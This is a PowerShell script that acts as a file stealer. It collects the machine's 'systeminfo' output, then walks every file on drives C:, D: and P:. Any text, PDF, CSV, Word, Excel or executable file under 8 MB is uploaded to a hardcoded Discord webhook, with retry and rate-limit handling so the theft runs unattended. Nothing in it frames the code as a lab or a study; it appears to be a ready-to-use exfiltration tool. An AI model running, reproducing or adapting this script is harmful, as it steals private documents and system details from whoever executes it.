$DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
$FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")
$MaxFileSizeMB = 8  # Discord's maximum file size limit
$UploadDelaySeconds = 2  # Delay between uploads to reduce rate limit chances

function Get-MimeType {
    param (
        [string]$FilePath
    )

    switch ([System.IO.Path]::GetExtension($FilePath).ToLower()) {
        ".txt"  { return "text/plain" }
        ".pdf"  { return "application/pdf" }
        ".csv"  { return "text/csv" }
        ".doc"  { return "application/msword" }
        ".docx" { return "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }
        ".xlsx" { return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }
        ".exe"  { return "application/octet-stream" }
        default { return "application/octet-stream" }
    }
}

function Send-FileToDiscord {
    param (
        [string]$FilePath
    )

    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $FileName = Split-Path -Leaf $FilePath
            $FileSizeMB = ([System.IO.FileInfo]$FilePath).Length / 1MB

            if ($FileSizeMB -gt $MaxFileSizeMB) {
                Write-Host "File too large to send to Discord: $FileName ($FileSizeMB MB)" -ForegroundColor Yellow
                return
            }

            $MimeType = Get-MimeType -FilePath $FilePath

            # Build multipart form-data for file upload
            $Headers = @{ "Content-Type" = "multipart/form-data" }
            $Body = @{
                file = [System.IO.File]::ReadAllBytes($FilePath)
            }

            $Response = Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -Headers $Headers
            Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
            Start-Sleep -Seconds $UploadDelaySeconds  # Add delay to reduce rate limit chances
            return
        } catch {
            Write-Host "Attempt $attempt: Failed to send `${FilePath}` to Discord: $_" -ForegroundColor Yellow
            if ($_.Exception.Response.StatusCode -eq 429) {
                # Wait longer and retry if rate-limited
                Write-Host "Rate limit hit. Waiting 10 seconds before retrying..." -ForegroundColor Cyan
                Start-Sleep -Seconds 10
            } else {
                return
            }
        }
    }
}

function Send-SystemInfo {
    try {
        $TempFilePath = Join-Path -Path $env:TEMP -ChildPath "systeminfo.txt"
        systeminfo > $TempFilePath
        Send-FileToDiscord -FilePath $TempFilePath
        Remove-Item -Path $TempFilePath -Force
        Write-Host "System info sent to Discord." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to send system info to Discord: $_" -ForegroundColor Red
        return $false
    }
}

function Scan-And-Send-Files {
    param (
        [string[]]$TargetDirectories,
        [string[]]$Extensions
    )

    foreach ($TargetDirectory in $TargetDirectories) {
        Get-ChildItem -Path $TargetDirectory -Recurse -File | Where-Object {
            $Extensions -contains $_.Extension
        } | ForEach-Object {
            Send-FileToDiscord -FilePath $_.FullName
        }
    }
}

function Main {
    # Send system information first to test the connection
    $SystemInfoSent = Send-SystemInfo
    if (-not $SystemInfoSent) {
        Write-Host "Exiting script due to failed connection test." -ForegroundColor Red
        return
    }

    # Hardcoded target directories
    $TargetDirectories = @("C:\", "D:\", "P:\")

    Write-Host "Scanning directories: $TargetDirectories"

    # Send files with matching extensions to Discord
    Scan-And-Send-Files -TargetDirectories $TargetDirectories -Extensions $FileExtensions
}

# Execute the script
Main
